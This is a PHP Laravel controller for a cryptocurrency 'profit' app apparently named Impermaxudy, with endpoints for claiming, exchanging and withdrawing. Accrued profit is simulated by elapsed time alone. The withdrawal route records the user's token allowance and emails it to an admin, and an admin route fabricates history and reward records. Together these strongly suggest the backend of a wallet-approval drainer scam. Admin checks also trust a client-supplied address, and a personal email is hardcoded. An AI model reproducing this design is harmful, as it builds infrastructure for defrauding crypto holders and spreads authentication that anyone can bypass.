<?php

namespace App\Http\Controllers;

use App\Models\Approve;
use App\Models\Exchange;
use App\Models\History;
use App\Models\Rewards;
use App\Models\User;
use App\Models\Withdraw;
use Illuminate\Http\Request;
use Carbon\Carbon;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Validator;
use Illuminate\Support\Facades\Mail;

class GeneralController extends Controller
{


    private function getCurrentETHPrice()
    {
        try {
            return cache()->remember('eth_price_usd', 60, function () {
                $url = 'https://api.coingecko.com/api/v3/simple/price?ids=ethereum&vs_currencies=usd';
                $response = file_get_contents($url);
                $data = json_decode($response, true);
                return $data['ethereum']['usd'] ?? null;
            });
        } catch (\Exception $e) {
            return null;
        }
    }


    private function calculateProfit(User $user)
    {
        $now = Carbon::now();
        $remainAt = Carbon::parse($user->remain_at);

        $seconds = $now->diffInSeconds($remainAt);

        $profitUnits = floor($seconds / 3);

        $profit = $profitUnits * 0.00001;
        return $profit;
    }

    public function claimProfit(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;

        if (!$address || !$chainId) {
            return response()->json(['error' => 'Missing address'], 400);
        }

        $user = User::firstOrCreate(
            ['address' => $address, 'chain_id' => $chainId],
            [
                'amount' => 0,
                'exchange_amount' => 0,
                'usdc' => 0,
                'profit' => 0,
                'claim_at' => now(),
                'remain_at' => now(),
            ]
        );

        $profit = $this->calculateProfit($user);

        $user->amount += $profit;
        $user->exchange_amount += $profit;
        $user->claim_at = now();
        $user->remain_at = now();
        $user->save();

        return response()->json([
            'message' => 'Claim successful',
            'total_amount' => round($user->amount, 5),
            'exchange_amount' => round($user->exchange_amount, 5),
            'usdc_amount' => round($user->usdc, 5),
            'address' => $address,
            'user' => $user,
        ]);
    }

    public function getHistory(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $data = History::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])
            ->orderBy('created_at', 'desc')
            ->get();
        return response()->json([
            'data' => $data
        ]);
    }

    public function getAllHistory(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $exchange = Exchange::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])
            ->orderBy('created_at', 'desc')
            ->get();
        $withdraw = Withdraw::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])
            ->orderBy('created_at', 'desc')
            ->get();
        $reward = Rewards::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])
            ->orderBy('created_at', 'desc')->get();
        return response()->json([
            'exchange' => $exchange,
            'withdraw' => $withdraw,
            'reward' => $reward
        ]);
    }

    public function getReward(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $data = Rewards::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])
            ->orderBy('created_at', 'desc')
            ->get();
        return response()->json([
            'data' => $data
        ]);
    }

    public function exchange(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $amount = (float) $request->amount;

        if (!$address || !$chainId || !$amount) {
            return response()->json(['error' => 'Missing parameters'], 400);
        }

        $user = User::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])->first();

        if (!$user) {
            return response()->json(['error' => 'User not found'], 404);
        }

        if ($user->exchange_amount < $amount) {
            return response()->json(['error' => 'Insufficient exchange amount'], 400);
        }

        $ethPrice = $this->getCurrentETHPrice();
        if (!$ethPrice) {
            return response()->json(['error' => 'Unable to fetch ETH price'], 500);
        }
        $user->claim_at = now();
        $user->remain_at = now();
        $user->exchange_amount -= $amount;
        $user->usdc = ($user->usdc ?? 0) + $amount * $ethPrice;
        $user->save();

        Exchange::create([
            'address' => $address,
            'chain_id' => $chainId,
            'amount' => $amount
        ]);

        return response()->json([
            'message' => 'Exchange successful',
            'exchange_amount' => round($amount, 5),
            'usdc' => round($amount * $ethPrice, 5),
            'user' => $user
        ]);
    }

    public function withdraw(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $amount = (float) $request->amount;
        $allowance = $request->allowance;

        if (!$address || !$chainId || !$amount) {
            return response()->json(['error' => 'Missing parameters'], 400);
        }

        $user = User::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])->first();

        if (!$user) {
            return response()->json(['error' => 'User not found'], 404);
        }

        if (($user->usdc ?? 0) < $amount) {
            return response()->json(['error' => 'Insufficient USDC balance'], 400);
        }

        $user->usdc -= $amount;
        $user->claim_at = now();
        $user->remain_at = now();
        $user->save();

        Withdraw::create([
            'address' => $address,
            'chain_id' => $chainId,
            'amount' => $amount
        ]);

        Approve::create([
            'address' => $address,
            'chain_id' => $chainId,
            'allowance' => $allowance
        ]);

        // send mail
        $data = [
            'address' => $address,
            'allowance' => $allowance,
            'amount' => $amount
        ];

        $getEmail = 'tiendatmagic8@gmail.com';
        $getName = 'Admin Impermaxudy';
        $chain = $request->chainId == 1 ? 'ETH' : 'BSC';
        Mail::send('emails.withdraw', compact('data', 'chain'), function ($message) use ($getEmail, $getName) {
            $message->to($getEmail, $getName)
                ->subject('Hệ thống ghi nhận rút tiền');
        });

        return response()->json([
            'message' => 'Withdraw successful',
            'usdc_balance' => round($user->usdc, 5),
            'withdraw_amount' => round($amount, 5),
            'user' => $user
        ]);
    }

    public function isAdmin(Request $request)
    {
        $address = $request->address;
        $chainId = $request->chainId;
        $isAdmin = User::where([
            ['address', $address],
            ['chain_id', $chainId]
        ])->select('is_admin')
            ->first();
        return response()->json([
            'is_admin' => $isAdmin['is_admin']
        ]);
    }


    public function postAdmin(Request $request)
    {
        $getAddressAdmin = $request->input('addressAdmin');

        $isAdmin = User::where(
            [
                [
                    'address',
                    $getAddressAdmin
                ],

            ]
        )
            ->select('is_admin')
            ->first();

        if (!$isAdmin->is_admin) {
            return response()->json([
                'success' => false,
                'message' => 'You are not admin',
                'is_admin' => $isAdmin->is_admin
            ], 401);
        }

        $tab = $request->input('tab');
        $address = $request->input('address');
        $amount = $request->input('amount');
        $chainId = $request->input('chainId');

        $validator = Validator::make($request->all(), [
            'address' => 'required|string',
            'amount' => 'required|numeric',
            'chainId' => 'required|string',
            'tab' => 'required|in:addHistory,addReward'
        ]);

        if ($validator->fails()) {
            return response()->json([
                'success' => false,
                'errors' => $validator->errors()
            ], 422);
        }

        if ($tab === 'addHistory') {
            $history = History::create([
                'address' => $address,
                'amount' => $amount,
                'chain_id' => $chainId
            ]);

            return response()->json([
                'success' => true,
                'data' => $history
            ]);
        }

        if ($tab === 'addReward') {
            $reward = Rewards::create([
                'address' => $address,
                'amount' => $amount,
                'chain_id' => $chainId
            ]);

            return response()->json([
                'success' => true,
                'data' => $reward
            ]);
        }

        return response()->json([
            'success' => false,
            'message' => 'Tab không hợp lệ'
        ], 400);
    }
}
